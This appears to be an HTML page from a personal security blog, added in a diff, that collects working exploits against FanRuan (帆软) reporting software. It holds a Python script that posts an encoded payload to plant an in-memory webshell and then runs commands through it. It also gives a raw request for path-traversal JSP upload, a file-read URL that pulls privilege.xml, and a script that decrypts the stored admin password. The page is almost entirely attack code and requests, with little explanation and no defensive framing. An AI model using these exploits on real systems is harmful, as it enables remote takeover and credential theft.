@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>帆软 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5e06\u8f6f", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u67e5\u770b\u7248\u672c", url: "#_3" },
+              {title: "channel \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#channel" },
+              {title: "v9 \u6587\u4ef6\u4e0a\u4f20", url: "#v9" },
+              {title: "V8 get_geo_json \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#v8-get_geo_json" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-link">
+        广联达
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/" class="btn btn-xs btn-link">
+        大华
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">帆软</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#查看版本">查看版本</a></li>
+<li><a href="#channel-远程命令执行漏洞">channel 远程命令执行漏洞</a></li>
+<li><a href="#v9-文件上传">v9 文件上传</a></li>
+<li><a href="#V8-get_geo_json-任意文件读取漏洞">V8 get_geo_json 任意文件读取漏洞</a></li>
+</ul>
+<p><img alt="" src="../image/image_jNhpSJMSFz.png" /></p>
+<h2 id="_3">查看版本</h2>
+<pre><code class="language-纯文本">/decision/system/info
+</code></pre>
+<p><img alt="" src="../image/image_OQWPXSVa8f.png" /></p>
+<h2 id="channel">channel 远程命令执行漏洞</h2>
+<p>python脚本，写内存马</p>
+<pre><code class="language-纯文本">import base64
+import requests
+payload = b&quot;H4sIAAAAAAAAAK1YS2wbVRS9z47jxE2aJun/m7Rpm/5m0qRp0ibQpvnVrfNRHVoUL8LL+CWeMJ6ZzrxJbRbsYMOmCCS2rGBBkSiL8lkAFVIlkLoAlQ0IxAKVDR+JbrqhcN+bsR2S1ElDLXnGvnPvefdz3r3PvvE7RFwH6ufoPFU8rhvKeepmRqgdiX5/+8vNL3wThtAQxAyLpoeoxi0nDtU84zA3YxnpnH3mLMjXtSq8hMQbwdo0K6vMOArP6E5asZxZJaNPM8eknCnMnNVNpri2rkzkbZa+TA2P1d99c+S3h1+9FYJQAio4yjkcSCCKOuOoEkVFFLWIogoVVdj3JCAyLyA4NCREDKpBzVl1bHqOabwnZ6M3x8p4I3CUfitrWyYzuQAce1X9qXbu5u4QrJ+EnZrDUG0wa/O81HJ1ztxBk04bLD0JDRnqjlp81DOMcceymcPzkxDR3YssH4caOxAlbWomoE6j5oA1mOMOZlG3TA6NC/w9Z1kGo2ZPCqIadTWaxng6U+Uy4OdRxTyq/b5FkucNkY96rRiPZxv6S+gDPFs2majG1KKV2r/YHkFj+FXn+RFLeHawHNpgURGjWTdnoZfpIca1DNqVjUgqBXa1heSN0ixzMVepBclKckc3Z1GrsaiFFaDTuoELcwilJhcAiJq6Ky1dolMKmguWkpnDzGQOFQXDVVF1VhdoHeXRZD4XmWMOq8UySc0S7O5alTv+jsu3TBQMe3IOHF2Jz33TrmSZsLr3yt3rb4/eJ7g1c7a/VYktdsXZcigiAKVICGXcmrOWkOILby5659HzNAQVCVhfVO43qIsZql9QLykS8Vs217M+IZ8pF/90njMNiSDZfYnNGExumbGCOWLV2NTB1YYZ5wKubDoLBVWppjHXlai+YQkouVYg31DUZeAJMloo0ZKsXm7+NvvB9VufhyDi95d+z+VWtk8uaDnuor6C/WJWOoAp7y5LyvJJ0E2XU9y4FOnGQV2Z3fEFBqJruWv3opBBn56eE0A8LpUFCMWHkJMkCIT2fRe98KudKJCdIM8vrAlqhPGMlY5nbaMlyRydGkOWk627+mHDJ78M/FVgvMkpNjdH0vsqvAwbUZpmmkFFe1oojWUlnOhl/x1TQSdLlIoqdIRVU86ed+C0cN71TOk3tamWYUqOoqmim1wEYSg51+CagmTKKRMM/cW4XOF39ZWx2+aN9zrCUBmH2indTCPLRr0sxh6H9VNoYLoG43GU51IQmyrsOSxhOJU6l4LKKc3fyg2pZfZyZMoseIoTZ8ryuO3xYAjKFrnZNxInCrUkxyoLmwPY0ZG3Y0usKtB7bhdfSIaDZckg+51s3LRialfDnddOF2sv1mnAVifuewWz/sEXAoroLv69bdPs7A9dBeUQykOpczcebHlYWTXxcyCuvP31o08/w8ftcCoGYdgbha4o7I/CAQIbXEmLy8h57EzPxQcIkAsEavstf2PI7h95v+mNB6//+OezBCp7dVPn+CHceugygYp+TDWBugQSyC/KhDhTEGSHpSEsUkh8D4QVGLpLoDHJvemJoHDjNC/OZARq4maBhAyVOhN51/KdU21fx/WrMEzTmHO3ZRmUHoLDSYhmkOYEnFa5h5F4cvv6xFMl8dQC8VRJPHVgbKQntax21ijp+v6I/qYmg49yKJ6nZtrAjStSUpW2NC+LJCVw7ImWR9OMj4Phn/v/zhCIDeY0ZguZG4WDBN55snys6EGaZ9WBiZG+nO7GuTgfYA99OjnUAzjBg7V4QSAa5JJA39PIZNLyHI0N6YLGNQEDFdEZaiAG66LQSqBjDYQl8vyyqoo4Ho6pLFOLp6IAicBG2aF0q+S83G2nVotcQCqyhcCeFWLBEvVqRtAK6ktt9ZLvZBQOY85QMfhOYFProcQStZ4aOArHYnAEFAJHbBwhTRnO7dOq6jmG0t55qiNN2QybVnR7/qRy/ERHh8I80TmroA27CcsxjcDB1qWDaOFa2JbFUMS12qFDrHUC21uSU+1F/HEYNKbdpXDHr2EXOt7R1nb8BK7f1t3V1tVOcDiU1+iBZvzVGAb0Ct/bIQKVeI/K35JVUoYswWsNSlS8E7xHDn8E5KZUqcVrpRSqsB6vNb4C1EG3GAHQCBtRSxifwXdYyBYbnpCGTf7DwFB82gSb5XMCW2ArWmzDz76PAnZHABuX0mVguyXsYf/hsrA7YZf8wYxZhD24fGmBKjhUDLoFnwitunchTBIfg9pw/BZ0XrkpDU/KoIjQaJLrN0M93mP4KAT7YANUe2L6Kah7rzjKdohRtikKW6KwNQrbVjvKrt7X/+jNDm99OqMsPGRZS0bX/hVHF1qtpqlsJ7BvFVAY+uJ/DB7bFFba2GV5TFbP495FPG6QzxvldeOC6m4W1bXxwIS7yrGvEciJSkfkaSckjz7ickRc2nP/AmooaxnkEQAA&quot;
+b64_payload = base64.b64decode(payload)
+# proxies = {'http': 'http://localhost:8899', 'https': 'http://localhost:8899'}
+header = {
+'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+'Accept-Encoding': 'gzip, deflate',
+'Accept': '*/*'
+}
+post_payload = b64_payload
+res = requests.post(&quot;http://aaa.com/webroot/decision/;/remote/design/channel&quot;,data = post_payload,headers=header,verify=False)
+print(res.status_code)
+# with open(&quot;result.txt&quot;, &quot;a&quot;) as o:
+#     o.write(res.text)
+print(res.text)
+</code></pre>
+<pre><code class="language-纯文本">http://a.com/webroot/faviconjs.css?filename=1&amp;cmd=whoami
+</code></pre>
+<h2 id="v9">v9 文件上传</h2>
+<p><img alt="" src="../image/image_ZsFzqXA2Q2.png" /></p>
+<pre><code class="language-纯文本">POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
+Host: 192.168.10.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE
+Connection: close
+Content-Type:text/xml;charset=UTF-8
+
+Content-Length: 74
+
+{&quot;__CONTENT__&quot;:&quot;&lt;%out.println(\&quot;Hello World!\&quot;);%&gt;&quot;,&quot;__CHARSET__&quot;:&quot;UTF-8&quot;}
+</code></pre>
+<h2 id="v8-get_geo_json">V8 get_geo_json 任意文件读取漏洞</h2>
+<p>读密码</p>
+<pre><code class="language-纯文本">/WebReport/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml
+</code></pre>
+<p><img alt="" src="../image/image_LTr6ghXU8X.png" /></p>
+<pre><code class="language-纯文本">cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文
+PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
+Password = &quot;&quot;
+cipher = cipher[3:] #截断三位后
+for i in range(int(len(cipher) / 4)):
+    c1 = int(&quot;0x&quot; + cipher[i * 4:(i + 1) * 4], 16)
+    c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+    Password = Password + chr(c2)
+print (Password)
+</code></pre>
+<p>用如上脚本解密得到密码</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/" class="btn btn-xs btn-link">
+        广联达
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E/" class="btn btn-xs btn-link">
+        大华
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
